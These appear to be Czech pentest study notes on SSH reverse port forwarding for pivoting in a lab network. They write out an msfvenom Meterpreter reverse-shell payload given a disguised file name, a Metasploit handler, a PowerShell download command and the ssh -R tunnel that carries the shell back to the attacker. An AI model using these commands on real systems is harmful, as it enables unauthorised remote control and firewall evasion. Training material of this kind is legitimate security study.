# Reverse / Remote Port Forwarding (-R)

Reverse port forwarding se používá při **pivotingu**, když potřebuji dostat spojení z izolovaného systému zpět na svůj útočný stroj.

Typický scénář:

- mám kompromitovaný **pivot host**
- v interní síti je další stroj, který nevidí přímo můj Kali
- potřebuji vytvořit cestu **z interní sítě → zpět ke mně**

---

# 1. Princip Reverse Forwardingu

Normální Local Forward:

```
Kali
 |
 | SSH
 |
Pivot
 |
Internal Service
```

Provoz jde:

```
Útočník → Pivot → Interní síť
```

---

Reverse Forward:

```
Internal Host
      |
      |
 Pivot Host
      |
      |
 SSH Tunnel
      |
      |
 Kali Listener
```

Provoz jde:

```
Interní síť → Pivot → Kali
```

---

# 2. Kdy použít -R

Použití:

✅ Reverse shell z interního Windows stroje  
✅ Obcházení firewallů  
✅ Přístup z izolovaného segmentu zpět k útočníkovi  
✅ C2 komunikace přes pivot host

---

# 3. Workflow Reverse Tunnelu

## Topologie

```
Kali
10.10.14.5

      SSH

Pivot Ubuntu
172.16.5.129
10.129.202.64

      |

Windows Target
172.16.5.19
```

Cíl:

Windows → Pivot → Kali

---

# 4. Vytvoření Payloadu

Payload musí mířit na adresu, kterou Windows vidí.

Ne na Kali IP.

Použijeme IP pivot hosta:

```
msfvenom -p windows/x64/meterpreter/reverse_https \
LHOST=172.16.5.129 \
LPORT=8080 \
-f exe \
-o backupscript.exe
```

Význam:

|Parametr|Hodnota|
|---|---|
|LHOST|IP pivot hosta|
|LPORT|port otevřený na pivotu|

---

# 5. Listener na Kali

Metasploit:

```
msfconsole
```

Nastavení:

```
use exploit/multi/handler

set payload windows/x64/meterpreter/reverse_https

set LHOST 0.0.0.0

set LPORT 8000

run
```

Kali čeká:

```
Kali:8000
```

---

# 6. Přenos payloadu

Například:

```
Invoke-WebRequest `
http://172.16.5.129:8123/backupscript.exe `
-OutFile C:\backupscript.exe
```

---

# 7. Vytvoření Reverse SSH tunelu

Toto spouštím na Kali:

```
ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@10.129.202.64 -vN
```

Syntaxe:

```
ssh -R [PIVOT_IP]:[PORT_NA_PIVOTU]:[KALI_IP]:[KALI_PORT] user@pivot
```

---

Výsledek:

```
Windows
 |
 | 172.16.5.129:8080
 |
Pivot
 |
 SSH Tunnel
 |
 |
Kali
 |
8000
 |
Meterpreter
```

---

# 8. Spuštění payloadu

Na Windows:

```
C:\backupscript.exe
```

Spojení:

```
Windows
 ↓
Pivot:8080
 ↓
SSH tunnel
 ↓
Kali:8000
```

Výsledek:

```
meterpreter session opened
```

---

# SSH Forwarding přehled

|Typ|Parametr|Port otevírá|Směr|Použití|
|---|---|---|---|---|
|Local|-L|Kali|Kali → interní síť|RDP, DB, web|
|Dynamic|-D|Kali SOCKS|Kali → celá síť|Nmap, proxychains|
|Reverse|-R|Pivot|interní síť → Kali|Reverse shell|

---

# Local vs Reverse

## Local (-L)

Používám:

> "Já se chci dostat dovnitř."

Příklad:

```
Kali → Pivot → RDP server
```

---

## Reverse (-R)

Používám:

> "Něco uvnitř se potřebuje dostat ke mně."

Příklad:

```
Windows → Pivot → Kali
```

---

# Troubleshooting

## Metasploit vidí spojení z 127.0.0.1

Normální chování.

Důvod:

```
Windows
 ↓
SSH proces
 ↓
Metasploit
```

Metasploit vidí poslední článek tunelu.

---

## Firewall blokuje port

Kontrola:

```
sudo ufw status
```

Povolení:

```
sudo ufw allow 8080
```

---

## SSH GatewayPorts problém

SSH server musí umožnit vzdálené bindování.

Soubor:

```
/etc/ssh/sshd_config
```

Nastavení:

```
GatewayPorts yes
```

nebo:

```
GatewayPorts clientspecified
```

Restart:

```
systemctl restart ssh
```

---

# Pentester rozhodovací strom

```
Potřebuji přístup k jedné službě?
        |
        └── Ano → Local (-L)


Potřebuji skenovat interní síť?
        |
        └── Ano → Dynamic (-D)


Potřebuji reverse shell z izolovaného hostu?
        |
        └── Ano → Reverse (-R)
```